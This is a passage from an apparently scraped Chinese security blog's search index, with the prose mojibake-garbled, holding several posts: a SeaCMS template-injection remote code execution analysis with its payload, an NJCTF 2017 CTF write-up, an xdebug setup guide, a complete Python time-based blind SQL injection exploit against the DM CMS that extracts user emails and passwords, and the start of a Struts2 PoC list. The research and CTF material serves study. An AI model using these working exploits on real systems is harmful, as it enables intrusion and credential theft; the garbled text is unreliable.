¼ï¼Œä»¥åŠæ­£åˆ™\\bwhere\\bçš„ç»•è¿‡ /!02222select*/è¿™ä¸ªæ–¹æ³•ä¹Ÿæ˜¯ç»å¸¸å¬è¯´ï¼Œä¹Ÿåœ¨è¿™é‡Œç”¨åˆ°äº†ï¼Œä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­ã€‚ export_setçš„åº”ç”¨ï¼Œæ¯”è¾ƒé‡è¦çš„åº”ç”¨ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å¯ç”¨äºç»•è¿‡"},{"title":"seacms v6.5 å‰å°getshell","permalink":"http://blog.0kami.cn/2017/03/16/old-old-seacms-v6-5-getshell/","text":"æ¦‚è¿°å‰æ®µæ—¶é—´æ”¾åœ¨90secä¸Šçš„ä¸€ç¯‡ä»£ç å®¡è®¡ï¼Œæ”¶æ‹¾ä¸€ä¸‹æ”¾åˆ°è‡ªå·±åšå®¢ä¸Š åˆ†æcmsç‰ˆæœ¬ï¼š6.45ç›´æ¥ä¸Šä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051function parseIf($content)&#123; if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123; return $content; &#125;else&#123; $labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;); $labelRule2=&quot;&#123;elseif&quot;; $labelRule3=&quot;&#123;else&#125;&quot;; preg_match_all($labelRule,$content,$iar); $arlen=count($iar[0]); $elseIfFlag=false; for($m=0;$m&lt;$arlen;$m++)&#123; $strIf=$iar[1][$m]; $strIf=$this-&gt;parseStrIf($strIf); $strThen=$iar[2][$m]; $strThen=$this-&gt;parseSubIf($strThen); if (strpos($strThen,$labelRule2)===false)&#123; if (strpos($strThen,$labelRule3)&gt;=0)&#123; $elsearray=explode($labelRule3,$strThen); $strThen1=$elsearray[0]; $strElse1=$elsearray[1]; echo &quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;; eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifFlag=true;&#125;else&#123;\\$ifFlag=false;&#125;&quot;); if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125; &#125;else&#123; @eval(&quot;if(&quot;.$strIf.&quot;) &#123; \\$ifFlag=true;&#125; else&#123; \\$ifFlag=false;&#125;&quot;); if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125; &#125;else&#123; $elseIfArray=explode($labelRule2,$strThen); $elseIfArrayLen=count($elseIfArray); $elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]); $resultStr=$elseIfSubArray[1]; $elseIfArraystr0=addslashes($elseIfArray[0]); @eval(&quot;if($strIf)&#123;\\$resultStr=\\&quot;$elseIfArraystr0\\&quot;;&#125;&quot;); for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123; $strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIf=$this-&gt;parseStrIf($strElseIf); $strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen\\&quot;;&#125;&quot;); @eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\\$elseIfFlag=true;&#125;else&#123;\\$elseIfFlag=false;&#125;&quot;); if ($elseIfFlag) &#123;break;&#125; &#125; $strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;); $strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;)); if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0); @eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\\$resultStr=\\&quot;$strElseIfThen0\\&quot;;\\$elseIfFlag=true;&#125;&quot;); $content=str_replace($iar[0][$m],$resultStr,$content); &#125; &#125; return $content; &#125; &#125; ä¸Šé¢ä¸»è¦é€»è¾‘ä¸ºè§£æhtmlæ–‡ä»¶ä¸­çš„{if:}{end if}æ ‡ç­¾ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰åšä»»ä½•å¤„ç†å°±evalï¼Œé‚£ä¹ˆæˆ‘ä»¬æŸ¥æ‰¾ä¸€ä¸‹å¯¹åº”è°ƒç”¨çš„åœ°æ–¹ä¼šä¸ä¼šæœ‰æ¼æ´ã€‚ä¸»è¦å…³æ³¨å‰å°ï¼Œæ‰¾åˆ°ä¸€å¤„è§£ææœç´¢ç»“æœçš„é¡µé¢ï¼ˆsearch.phpï¼‰ï¼Œä»£ç æ¯”è¾ƒå¤šï¼Œä¸€ç‚¹ä¸€ç‚¹æ¥çœ‹ã€‚æ‰¾åˆ°è°ƒç”¨çš„ä½ç½®line 212$content=$mainClassObj-&gt;parseIf($content);å¾€ä¸Šçœ‹ï¼Œå‘ç°ä»–çš„é€»è¾‘æ˜¯å…ˆè§£æå…¶ä»–ç±»å‹çš„æ ‡ç­¾ï¼Œæ¯”å¦‚{searchpage:page}é‚£ä¹ˆæ¥ä¸‹æ¥çš„æ€è·¯ï¼Œä¸»è¦æ˜¯2ç‚¹ï¼ŒæŸ¥æ‰¾å¯¹åº”ifæ ‡ç­¾å¯æ§çš„ä½ç½®ï¼Œå¦ä¸€ç§å°±æ˜¯æŸ¥æ‰¾å…¶ä»–æ ‡ç­¾çš„å¯æ§å†…å®¹ï¼Œå†™å…¥ifæ ‡ç­¾æˆ‘æ‰¾åˆ°ä¸€å¤„å…¶ä»–æ ‡ç­¾å¯æ§ä¸”æ²¡æœ‰åšä»»ä½•å¤„ç†çš„ä½ç½®ï¼Œç›´æ¥å†™å…¥ifæ ‡ç­¾è¯­å¥å³å¯é€ æˆä»»æ„ä»£ç æ‰§è¡Œ1234567891011121314function echoSearchPage()&#123; global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost; $order = !empty($order)?$order:time;.........$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content); $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content); $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content); $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);......... orderå˜é‡å¯æ§å¹¶ä¸”åœ¨è°ƒç”¨parseIfå‡½æ•°å‰å…ˆè§£æï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡orderå†™å…¥ifæ ‡ç­¾ã€‚æŸ¥çœ‹ä¸€ä¸‹å…·ä½“htmlä»£ç 1234567&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt; &lt;div class=&quot;btn-group&quot;&gt; &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;æœ€æ–°ä¸Šæ˜ &lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;æœ€è¿‘çƒ­æ’­&lt;/a&gt; &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;è¯„åˆ†æœ€é«˜&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; é‚£ä¹ˆæ¥ä¸‹æ¥å°±å¯ä»¥æ„é€ pocäº†ï¼Œç±»ä¼¼sqlæ³¨å…¥ï¼Œæˆ‘ä»¬å…ˆæŠŠå‰é¢çš„ifæ ‡ç­¾è¯­å¥é—­åˆï¼Œå†™å…¥æ¶æ„ä»£ç å¹¶é—­åˆåé¢çš„ifæ ‡ç­¾ã€‚exampleï¼š}{end if}{if:1)phpinfo();if(1}{end if}æœ¬åœ°éªŒè¯ä¸€ä¸‹ æ€»ç»“è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒç»å…¸çš„æ¼æ´ï¼Œä¹Ÿå¯ä»¥è¢«ç§°ä¸ºæ¨¡ç‰ˆè§£æå§æˆ‘è§‰å¾—ï¼šï¼‰ps: åæ‚”å•Šï¼Œæ²¡æœ‰å…ˆæäº¤ä¸ªpocå¹³å°T_T"},{"title":"NJCTF2017 writeup","permalink":"http://blog.0kami.cn/2017/03/15/old-old-njctf-2017/","text":"æ¦‚è¿°è¾èŒåæ²¡äº‹æƒ…å¹²ï¼Œåˆšå¥½èµ¶ä¸Šnjctfï¼Œè¿˜æ˜¯ä¸€æ ·èœå•Šï¼Œåªåšäº†7é“é¢˜ï¼Œè¿˜è¦ç»§ç»­åŠªåŠ›ğŸ’ªï¼ˆps:æ¯•ä¸šè®¾è®¡ä»€ä¹ˆé¬¼å•Šï¼‰å†™ä¸€ä¸‹webçš„writeupï¼Œç”±äºé¢˜ç›®è¿˜å¼€ç€ï¼ŒæŠŠæ²¡åšå‡ºæ¥çš„åšä¸€éï¼Œçºªå½•ä¸€ä¸‹æˆ‘è§‰å¾—æœ‰å¿…è¦è®°çš„é¢˜ Webé¢˜Loginï¼ˆ100ï¼‰å¥½å§ï¼Œè¿™é“é¢˜å–äº†å·§ï¼Œè°è®©å¤§é»‘å®¢ä»¬éƒ½æ˜¯å¼±å¯†ç å‘¢ï¼ï¼ï¼ï¼ç”±äºæ²¡æœ‰åšéªŒè¯ç æœºåˆ¶ï¼Œæ‰€ä»¥æ‰«äº†ä¸€æ³¢å¼±å£ä»¤ï¼Œç„¶åâ€¦ç„¶åå°±è¿›å»å•¦å…¶å®è¿™é“é¢˜è€ƒçš„æ˜¯mysqlçš„é•¿åº¦é™åˆ¶æ¼æ´ã€‚åˆ©ç”¨2ä¸ªmysqlçš„ç‰¹æ€§ å½“æ•°æ®è¶…è¿‡å»ºè¡¨æ—¶çš„è§„å®šçš„æ•°æ®å¤§å°ï¼Œmysqlå°†è¶…è¿‡çš„éƒ¨åˆ†æˆªæ–­ å½“selectæ—¶whereæŸ¥è¯¢å­—å¥ä¸­çš„æ•°æ®å¦‚æœæœ€åä»¥ç©ºæ ¼ç»“å°¾ï¼Œmysqlé»˜è®¤å°†ç©ºæ ¼å»é™¤æŸ¥è¯¢é‚£ä¹ˆåˆ©ç”¨è¿™2ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬åªè¦æ³¨å†Œä¸€ä¸ªadmin+N*%20+xå°±å¯ä»¥å·²adminç™»é™†ï¼Œç„¶ågetflagï¼šNJCTF{4R3_Y0u_7H3_Re41_aDM1N?} Get Flag(100)è¿™é“é¢˜è€ƒäº†å‘½ä»¤æ‰§è¡Œæ¼æ´é¦–å…ˆå‘ç°å­˜åœ¨æ–‡ä»¶ä»»æ„è¯»å–æ¼æ´ï¼Œé‚£ä¹ˆå°è¯•è¯»å–ä¸€ä¸‹æºç ï¼Œæœ€åè¯•å‡ºæ¥æ˜¯app.pyå¯ä»¥çœ‹åˆ°æœ‰ä¸ªå‘½ä»¤æ‰§è¡Œå¹¶ä¸”æ˜¯å¯æ§çš„ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›å­—ç¬¦ï¼Œç”¨&amp;å°±å¯ä»¥ç»•è¿‡ã€‚ls æŸ¥çœ‹ä¸€ä¸‹å¯ä»¥çœ‹åˆ°flagæ–‡ä»¶9iZM2qTEmq67SOdJp%!oJm2%M4!nhS_thi5_flagcatä¸€æ³¢ï¼Œè¿™é‡Œçš„ç‰¹æ®Šå­—ç¬¦è½¬ç§»æ˜¯å…³é”® come on(200)å…·ä½“çœ‹å¤§ä½¬ä»¬çš„writeupå³å¯ï¼Œè¿™é“é¢˜ä¸»è¦å­¦åˆ°äº†å…¶ç›²æ³¨çš„æ³¨å…¥æ–¹å¼ã€‚binaryå‡½æ•°ç”¨æ¥åŒºåˆ†å¤§å°å†™ 12345select xxx from xxx like x%select xxx from xxx like xx%select xxx from xxx like xxx%select xxx from xxx like xxxx%... é€šè¿‡likeæ¥ä½å‡ºæ•°æ® Be Admin(300)é¦–å…ˆå‘ç°æœ‰.bakæ–‡ä»¶ï¼Œä¸‹ä¸‹æ¥çœ‹ä¸€ä¸‹,å‘ç°è¿™é“é¢˜ä¸»è¦è€ƒçš„æ˜¯cbcå­—èŠ‚ç¿»è½¬æ”»å‡»å’Œpadding oracle attack.é¦–å…ˆç”±äºç™»é™†å‡ºå­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠæ•°æ®ä¸­çš„encrypt_passå–å‡ºæ¥ç™»é™†ç»•è¿‡å¯ä»¥é€šè¿‡phpå¼±ç±»å‹æ¯”è¾ƒæ¥ç»•è¿‡ï¼Œadminï¼0å³å¯ç™»é™†è¦é€šè¿‡cbcå­—èŠ‚ç¿»è½¬å¿…é¡»çŸ¥é“defaultIdçš„å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆè·‘å‡ºdefaultIdçš„å€¼padding oracle attackå‚è€ƒpadding oracle attackç¬¦åˆæˆ‘ä»¬ç°åœ¨çš„æƒ…å†µï¼š å·²çŸ¥çœŸå®IV å·²çŸ¥å¯¹åº”cipher text å½“è§£å¯†å¤±è´¥ERRORé”™è¯¯é¢˜ç›®ç¯å¢ƒå¯èƒ½åäº†ï¼Œæœ¬åœ°æ­ä¸€ä¸‹ï¼Œè·‘ä¸€ä¸‹ä¸­é—´å€¼éœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯padding oracle attackç¬¬ä¸€ä¸ªå­—ç¬¦æ²¡åŠæ³•è·‘å‡ºæ¥ï¼Œç”±äºæœ€åä¸€ä¸ªå­—ç¬¦è§£å‡ºæ¥æ˜¯ç©ºç™½æ‰€ä»¥è¿˜æ˜¯errorï¼Œä¸è¿‡æ²¡å…³ç³»æš´åŠ›ä¸€éå°±å¥½äº†ï¼ˆpsï¼šæœ‰äº†åŸç†ï¼Œå†™ä»£ç å¾ˆå®¹æ˜“ï¼Œå°±ä¸æ”¾ä»£ç äº†ï¼‰ æ€»ç»“æ¬ ç¼ºçš„è¿˜æ˜¯å¾ˆå¤šï¼Œç»§ç»­ğŸ’ª"},{"title":"phpä»£ç å®¡è®¡å‰çš„å‡†å¤‡","permalink":"http://blog.0kami.cn/2017/02/03/old-old-code-review-pre-prepare/","text":"æ¦‚è¿°æ‰€è°“â€œå·¥æ¬²å–„å…¶äº‹,å¿…å…ˆåˆ©å…¶å™¨â€ï¼Œåœ¨ä»£ç å®¡è®¡å‰ï¼Œæˆ‘ä»¬éœ€è¦å‡†å¤‡æé«˜æˆ‘ä»¬å®¡è®¡æ•ˆç‡çš„å·¥å…·ã€‚ ç¯å¢ƒ Mac xampp(å¯ä»¥ç”¨phpstudyæˆ–è€…æ˜¯å…¶ä»–é›†æˆç¯å¢ƒä»£æ›¿) Navicat Premium(ä¸ªäººè®¤ä¸ºMacä¸‹æœ€å¥½çš„æ•°æ®åº“ç®¡ç†å·¥å…·ï¼Œå­¦ç”Ÿå…šåªèƒ½ç”¨**,æœ‰èƒ½åŠ›å°½é‡æ”¯æŒæ­£ç‰ˆ) phpstorm(è¿™é‡Œçš„IDEç”¨çš„æ˜¯æˆ‘è‡ªå·±æ¯”è¾ƒä¹ æƒ¯çš„ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ä½ æ¯”è¾ƒç†Ÿæ‚‰çš„) xdebug(ç”¨æ¥åŠ¨æ€è°ƒè¯•) ç»ˆç«¯ æµè§ˆå™¨(firefoxã€chrome,è¿™é‡Œä½¿ç”¨firefox,hackbaræ˜¯ä¸ªå¥½ä¸œè¥¿) å®‰è£…ä¸Šè¿°çš„è½¯ä»¶ä¹‹ç±»çš„å°±ä¸è¯´äº†ï¼Œä¸‹æ–‡ä¸»è¦æ˜¯åŠ¨æ€è°ƒè¯•ç¯å¢ƒæ­å»ºã€‚ åŠ¨æ€è°ƒè¯•ç¯å¢ƒphpæ·»åŠ xdebugé…ç½®xamppçš„php.iniä½äº/install/path/etc/php.iniï¼Œåœ¨é…ç½®æ–‡ä»¶æœ€åæ·»åŠ ä¸Š 1234567891011[xdebug]zend_extension=/Applications/XAMPP/xamppfiles/lib/php/extensions/no-debug-non-zts-20131226/xdebug.soxdebug.remote_autostart=onxdebug.remote_enable=onxdebug.remote_enable=1xdebug.remote_mode=&quot;req&quot;xdebug.remote_log=&quot;/var/log/xdebug.log&quot;xdebug.remote_host=localhost/127.0.0.1xdebug.remote_port=9000xdebug.remote_handler=&quot;dbgp&quot;xdebug.idekey=&quot;PhpStorm&quot; soæ–‡ä»¶æ˜¯xamppè‡ªå¸¦çš„ï¼Œmacä¸‹çš„é…ç½®å¯ä»¥ç›´æ¥copyæˆ‘çš„ä¿å­˜åé‡å¯apache firefoxå®‰è£…xdebugæ‰©å±•firefoxä¸‹çš„xdebugæ‰©å±•å« the easiest xdebugï¼Œæœç´¢ä¸€ä¸‹å®‰è£…å®‰è£…å®Œæˆåç‚¹äº®å·¥å…·æ ä¸Šçš„ç”²è™«ï¼Œå¼€å¯è°ƒè¯•è®¾ç½®key,æ›´phpé…ç½®æ–‡ä»¶ä¸­ç›¸åŒ é…ç½®phpstormæ‰“å¼€Preferences-&gt;Languages&amp;Framework-&gt;phpå¦‚å›¾è®¾ç½®serversï¼Œæ¥ç€è®¾ç½®debugä¸‹çš„DBGp Proxyè®¾ç½®å®Œæˆååœ¨å·¥å…·æ å¤„æ‰¾åˆ°edit Configurationsæ–°å¢php web applicationæ¥ä¸‹æ¥å°±å¯ä»¥æ„‰å¿«çš„ä¸‹æ–­ç‚¹ï¼ŒåŠ¨æ€è°ƒè¯•äº† mysqlæ‰§è¡Œå®¡è®¡ç›‘æ§åœ¨navicatæˆ–ç»ˆç«¯ä¸­è¿è¡Œä»¥ä¸‹2å¥ set global general_log=on;set global log_output=â€™tableâ€™; æŸ¥çœ‹mysql.general_logè¡¨å¯ä»¥çœ‹åˆ°è¿è¡Œè¿‡çš„sqlè¯­å¥ï¼Œæ–¹ä¾¿æˆ‘ä»¬æŸ¥è¯¢winä¸‹å¯ä»¥ç”¨seayçš„ä»£ç å®¡è®¡å·¥å…·ï¼Œå¸¦äº†mysqlçš„sqlç›‘æ§ ç»ˆç«¯ç»ˆç«¯ä¸»è¦ç”¨åˆ°äº†grepè¿™ä¸ªå·¥å…·ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šç›¸å…³çš„æ•™æã€‚ä¸»è¦åŒ¹é…è¾“å…¥è¾“å‡ºç‚¹ï¼Œå±é™©å‡½æ•°ç­‰ç­‰å…·ä½“çš„ä»¥åæœ‰ç©ºäº†å†è¡¥å…… æ€»ç»“è®°å½•ä¸€ä¸‹è¿‡ç¨‹ï¼Œä»¥åèƒ½çœ‹çœ‹ï¼Œæ„‰å¿«çš„ä»£ç å®¡è®¡å§:P"},{"title":"DMä¼ä¸šå»ºç«™ç³»ç»Ÿå‰å°ç›²æ³¨","permalink":"http://blog.0kami.cn/2017/01/29/old-old-DM-sql-injection/","text":"æ¦‚è¿°ä»Šå¤©æäº†ä¸€ä¸‹åŠ¨æ€è°ƒè¯•çš„ä¸œè¥¿ï¼Œç„¶åé¡ºä¾¿çœ‹äº†çœ‹ä¸Šæ¬¡ä¸‹çš„DMä¼ä¸šå»ºç«™ç³»ç»Ÿ2017.01.23ã€‚ å‰å°cookie æ—¶é—´ç›²æ³¨å¤§è‡´è·Ÿäº†ä¸€ä¸‹å‡ ä¸ªå…¥å£æ–‡ä»¶ï¼Œè¯¥å¥—cmsä¸»è¦çš„å®‰å…¨æªæ–½ä¸ºhtmlentitiesï¼Œåœ¨POST&amp;&amp;GETçš„è¾“å…¥ç‚¹åšäº†htmlå®ä½“åŒ–çš„æ“ä½œï¼Œä½†æ˜¯è¿™å¹¶ä¸è½¬ä¹‰å•å¼•å·ï¼ˆé»˜è®¤ä¸è½¬ä¹‰å•å¼•å·å…·ä½“å¯çœ‹htmlentitiesï¼‰ï¼Œçœ‹äº†ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢çš„sqlè¯­å¥ï¼Œæ¶‰åŠåˆ°å­—ç¬¦ä¸²ç±»å‹æ—¶ï¼Œéƒ½æ˜¯å•å¼•å·é—­åˆï¼Œé‚£ä¹ˆå¾ˆæ¸…æ¥šï¼Œåœ¨è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢æ—¶å®¹æ˜“äº§ç”Ÿsqlæ³¨å…¥æ¼æ´ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥ä¸»è¦æ‰¾ä¸€ä¸‹è¿›è¡Œæ•°æ®åº“æ“ä½œçš„ä½ç½®ã€‚ POST&amp;&amp;GET COOKIE psï¼šè¿™é‡Œå°±éšä¾¿æ‰¾äº†ä¸€ä¸ªåœ°æ–¹ï¼Œå› ä¸ºè¿™å¥—ç³»ç»Ÿæ³¨å…¥ä¸è¦å¤ªå¤šï¼Œè¿åå°ç™»é™†éƒ½å¯ä»¥ :P å‰é¢æåˆ°å¯¹POST&amp;&amp;GETåšäº†å®ä½“è½¬ä¹‰ï¼Œä½†æ˜¯grepæ‰¾äº†ä¸€ä¸‹cookieï¼Œå‘ç°å¹¶æ²¡æœ‰å¯¹cookieçš„å€¼è¿›è¡Œå®‰å…¨æ“ä½œï¼Œç›´æ¥å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚indexDM_load.php Line 108 12345678910111213...if(@$_COOKIE[&quot;curstyle&quot;]&lt;&gt;&apos;&apos;) $curstyle = $_COOKIE[&quot;curstyle&quot;];else $curstyle = $row[&apos;curstyle&apos;]; ...$sqlstyle = &quot;SELECT * from &quot;.TABLE_STYLE.&quot; where pidname=&apos;$curstyle&apos; $andlangbh limit 1&quot;; //echo $sqlstyle;exit;if(getnum($sqlstyle)&gt;0)&#123; $rowstyle = getrow($sqlstyle); ä¸Šè¿°ä¸ºæ¼æ´çš„ä¸»è¦æˆå› ç‚¹ï¼Œå¦‚æœcookieä¸­å­˜åœ¨curstyle,ä¼˜å…ˆé€‰ç”¨cookieä¸­çš„å€¼ï¼Œç„¶åå¸¦å…¥æ•°æ®åº“æŸ¥è¯¢ã€‚ç”±äºæ²¡æœ‰æ‰¾åˆ°å…·ä½“å›æ˜¾æ•°æ®çš„åœ°æ–¹ï¼Œæ‰€ä»¥é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ–¹å¼è·å–æ•°æ®ã€‚ å¸¦ä¸Šè‡ªå·±å†™çš„EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#!/usr/bin/env python# -*- coding: utf-8 -*-# Created by wh1t3P1g at 2017/1/30import requests,timeclass CookieBlindSqlInjection: def __init__(self,url): self.url=url self.len=0 def getLength(self,column,table): payload0 = &quot;curstyle=1&apos;||if((select length(cast(bin(length(&#123;column&#125;)) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(length(&#123;column&#125;)),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; #first confirm bin-format data length len=0 for i in range(1,9): cookie=payload0.format(column=column,table=table,line_start=0,flag=i) flag=self.send(cookie) if flag==&quot;0&quot;: len=i break res=&quot;&quot; for i in range(1,len+1): cookie=payload1.format(column=column,col_start=i,table=table,line_start=0) flag=self.send(cookie) res+=flag # print res self.len=int(res,2) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot; length: &quot;+str(self.len)) return int(res,2) def getData(self,column,table): payload0=&quot;curstyle=1&apos;||if((select length(cast(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))) as char)) from &#123;table&#125; limit &#123;line_start&#125;,1)=&#123;flag&#125;,sleep(5),1)=1#&quot; payload1 = &quot;curstyle=1&apos;||if((select substr(bin(ascii(substr(&#123;column&#125;,&#123;data_start&#125;,1))),&#123;col_start&#125;,1) from &#123;table&#125; limit &#123;line_start&#125;,1)=1,1,sleep(5))=1#&quot; total_res=&quot;&quot; for i in range(1,self.len+1):#å…·ä½“æ•°æ®çš„é•¿åº¦ len = 0 for j in range(1, 9): cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j) flag = self.send(cookie) if flag == &quot;0&quot;: len = j break # print &quot;len:&quot;+str(len) res = &quot;&quot; for k in range(1, len + 1): cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0) flag = self.send(cookie) res += flag # print res total_res+=chr(int(res,2)) pprint(&quot;*&quot;, &quot;fetch &quot;+column+&quot;: &quot;+total_res) return total_res def send(self,cookie): headers=&#123;&quot;Cookie&quot;:cookie&#125; try: r = requests.get(self.url, headers=headers,timeout=4) return &quot;1&quot; except: return &quot;0&quot;def pprint(flag,content): print &quot;[&#123;flag&#125;] [&#123;time&#125;] &#123;content&#125;&quot; \\ .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)if __name__==&apos;__main__&apos;: cookieBlindSqlInjection=CookieBlindSqlInjection(&quot;http://127.0.0.1/cms/DM/20170123/&quot;) pprint(&quot;*&quot;,&quot;program start&quot;) pprint(&quot;*&quot;, &quot;start fetching column[email]&quot;) cookieBlindSqlInjection.getLength(&quot;email&quot;,&quot;zzz_user&quot;) email=cookieBlindSqlInjection.getData(&quot;email&quot;,&quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;start fetching column[ps]&quot;) cookieBlindSqlInjection.getLength(&quot;ps&quot;, &quot;zzz_user&quot;) ps=cookieBlindSqlInjection.getData(&quot;ps&quot;, &quot;zzz_user&quot;) pprint(&quot;*&quot;, &quot;[email]: &quot;+email+&quot; ,[ps]: &quot;+ps) pprint(&quot;*&quot;, &quot;program done&quot;) ps:DMè¿™ä¸ªé¬¼ï¼Œä»£ç å†™çš„å¥½ä¹±å•ŠT_T"},{"title":"Struts2å‘½ä»¤æ‰§è¡Œå„ç‰ˆæœ¬è®°å½•","permalink":"http://blog.0kami.cn/2017/01/13/old-old-Struts2-history-payload/","text":"æ¦‚è¿°æœ€è¿‘åœ¨å†™Struts2çš„ä¸€äº›PoCï¼Œè®°å½•ä¸€ä¸‹å„ä¸ªç‰ˆæœ¬çš„PoCæ–¹ä¾¿åˆ°æ—¶å€™æŸ¥é˜…ã€‚å…ˆæä¸€ä¸‹å‚è€ƒçš„å‰è¾ˆä»¬çš„ç½‘å€ï¼Œæ„Ÿè°¢ğŸ™ http://rickgray.me/2016/05/06/review-struts2-remote-command-execution-vulnerabilities.html http://www.cnblogs.com/LittleHann/p/4606891.html https://cwiki.apache.org/confluence/display/WW/S2-xxx http://blog.nsfocus.net/tech/%E7%83%AD%E7%82%B9%E8%B7%9F%E8%B8%AA/2016/06/16/Struts2-S2-037(CVE-2016-4438)%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html https://cwiki.apache.org/confluence/display/WW/S2-009 Struts2å‘½ä»¤æ‰§è¡Œé›†åˆä¸‹æ–‡ä¸æ˜¯å…·ä½“çš„åˆ†ææ–‡ï¼Œèƒ½åŠ›æœ‰é™ï¼Œä»…è®°å½•ä¸€ä¸‹ä»¥åšå°†æ¥å¤ä¹ æŸ¥ç”¨ã€‚è¿‡æ®µæ—¶é—´ä¼šå°†æ‰€æœ‰çš„æ¼æ´ç¯å¢ƒä¸Šä¼ åˆ°githubä¸Šï¼Œç¯å¢ƒæ¥æºå¤§éƒ¨åˆ†ä¸ºæˆ‘å¶åƒrickgrayåšå®¢ä¸Šå…±äº«çš„ä»¥åŠå®˜ç½‘ä¸Šä¸‹çš„å¯¹åº”ç‰ˆæœ¬çš„ç¤ºä¾‹ç¯å¢ƒã€‚update:2017/1/16 ç¯å¢ƒåœ°å€ Struts2 S2-001å½±å“ç‰ˆæœ¬ï¼š2.0.0 - 2.0.8 å…·ä½“è¯¦æƒ…ï¼šhttps://struts.apache.org/docs/s2-001.html è¯¥æ¼æ´å› ä¸ºç”¨æˆ·æäº¤è¡¨å•æ•°æ®å¹¶ä¸”éªŒè¯å¤±è´¥æ—¶ï¼Œåç«¯ä¼šå°†ç”¨æˆ·ä¹‹å‰æäº¤çš„å‚æ•°å€¼ä½¿ç”¨ OGNL è¡¨è¾¾å¼ %{value} 